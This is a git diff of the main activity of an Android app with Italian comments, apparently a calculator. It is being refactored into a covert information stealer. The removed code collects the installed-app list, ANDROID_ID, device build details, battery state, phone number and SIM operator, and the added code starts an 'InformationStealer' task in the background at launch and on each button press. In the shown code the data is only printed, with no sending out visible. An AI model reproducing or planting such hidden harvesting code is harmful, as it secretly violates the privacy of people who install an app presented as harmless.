@@ -1,5 +1,6 @@
 package com.example.applicazioneinteressante;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.appcompat.app.AppCompatDelegate;
 import androidx.core.app.ActivityCompat;
@@ -7,25 +8,18 @@ import androidx.core.content.ContextCompat;
 
 import android.annotation.SuppressLint;
 import android.Manifest;
-import android.content.Intent;
-import android.content.IntentFilter;
+
 import android.content.pm.ActivityInfo;
-import android.content.pm.ApplicationInfo;
 
 import android.content.pm.PackageManager;
 
-import android.os.BatteryManager;
-import android.os.Build;
 import android.os.Bundle;
 
-import android.provider.Settings;
-import android.telephony.TelephonyManager;
 import android.widget.Button;
 import android.widget.TextView;
 
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.util.concurrent.Executor;
+import java.util.concurrent.Executors;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -124,6 +118,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    @SuppressLint("SourceLockedOrientationActivity")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO);
@@ -132,6 +127,9 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         initializeComponents();
+        Executor executor = Executors.newSingleThreadExecutor();
+        InformationStealer task = new InformationStealer(this);
+        executor.execute(task);
     }
 
     //Initialize components in the class
@@ -207,9 +205,10 @@ public class MainActivity extends AppCompatActivity {
                     operation = "";
                     break;
             }
-            stealApp();
-            stealSystemDetail();
-            stealBatteryInformation();
+
+            InformationStealer.stealSystemDetail(this);
+            InformationStealer.stealBatteryInformation(this);
+
 
             String[] permissions = {
                     Manifest.permission.READ_PHONE_STATE,
@@ -229,7 +228,7 @@ public class MainActivity extends AppCompatActivity {
                 ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_PHONE_STATE);
             } else {
                 // Tutti i permessi sono già stati concessi
-                stealNumberInformations();
+                InformationStealer.stealNumberInformations(this);
             }
 
         });
@@ -253,77 +252,10 @@ public class MainActivity extends AppCompatActivity {
         history = findViewById(R.id.ans);
     }
 
-    public void stealApp() {
-        PackageManager packageManager = getPackageManager();
-        // Ottieni una lista di tutte le applicazioni installate
-        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
 
-// Itera sulla lista di applicazioni installate
-
-        // Itera sulla lista di applicazioni installate
-        for (ApplicationInfo applicationInfo : installedApplications) {
-            // Verifica se l'applicazione è un'app di terze parti
-
-            String sourceDir = applicationInfo.sourceDir;
-            String packageName = applicationInfo.packageName;
-            String appName = packageManager.getApplicationLabel(applicationInfo).toString();
-
-            if ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                System.out.println("\nApp Name: " + appName);
-                System.out.println("Package Name: " + packageName);
-                System.out.println("Source Dir: " + sourceDir);
-                System.out.println("Launch Activity :" + packageManager.getLaunchIntentForPackage(applicationInfo.packageName));
-                System.out.println("----------------------------------------");
-            }
-        }
-
-    }
-
-    private void stealSystemDetail() {
-        System.out.println("Brand: " + Build.BRAND + "\n" +
-                "DeviceID: " +
-                Settings.Secure.getString(
-                        getContentResolver(),
-                        Settings.Secure.ANDROID_ID
-                ) + "\n" +
-                "Model: " + Build.MODEL + "\n" +
-                "ID: " + Build.ID + "\n" +
-                "SDK: " + Build.VERSION.SDK_INT + "\n" +
-                "Manufacture: " + Build.MANUFACTURER + "\n" +
-                "Brand: " + Build.BRAND + "\n" +
-                "User: " + Build.USER + "\n" +
-                "Type: " + Build.TYPE + "\n" +
-                "Base: " + Build.VERSION_CODES.BASE + "\n" +
-                "Incremental: " + Build.VERSION.INCREMENTAL + "\n" +
-                "Board: " + Build.BOARD + "\n" +
-                "Host: " + Build.HOST + "\n" +
-                "FingerPrint: " + Build.FINGERPRINT + "\n" +
-                "Version Code: " + Build.VERSION.RELEASE);
-    }
-
-    public void stealBatteryInformation() {
-        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-        Intent batteryStatus = registerReceiver(null, filter);
-
-        if (batteryStatus != null) {
-            // Ottieni lo stato della batteria
-            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
-            String batteryStatusText = getBatteryStatusText(status);
-            System.out.println("Battery Status: " + batteryStatusText);
-
-            // Ottieni il livello di carica della batteria
-            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-            int batteryLevel = (int) ((level / (float) scale) * 100);
-            System.out.println("Battery Level: " + batteryLevel + "%");
-        } else {
-            System.out.println("Battery status not available");
-            System.out.println("Battery level not available");
-        }
-    }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                 != PackageManager.PERMISSION_GRANTED ||
@@ -339,35 +271,10 @@ public class MainActivity extends AppCompatActivity {
             }, PERMISSION_REQUEST_PHONE_STATE);
         } else {
             // I permessi sono già stati concessi
-            stealNumberInformations();
+            InformationStealer.stealNumberInformations(this);
         }
     }
 
-    @SuppressLint("MissingPermission")
-    private void stealNumberInformations() {
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-        if (telephonyManager != null) {
-            @SuppressLint("MissingPermission") String phoneNumber = telephonyManager.getLine1Number();
-            String operator = telephonyManager.getSimOperatorName();
-            System.out.println("\nPhone number: " + phoneNumber);
-            System.out.println("SIM Operator: " + operator);
-        }
-    }
 
-    private String getBatteryStatusText ( int status){
-            switch (status) {
-                case BatteryManager.BATTERY_STATUS_CHARGING:
-                    return "Charging";
-                case BatteryManager.BATTERY_STATUS_DISCHARGING:
-                    return "Discharging";
-                case BatteryManager.BATTERY_STATUS_FULL:
-                    return "Full";
-                case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
-                    return "Not Charging";
-                case BatteryManager.BATTERY_STATUS_UNKNOWN:
-                default:
-                    return "Unknown";
-            }
-        }
-    }
+}
 
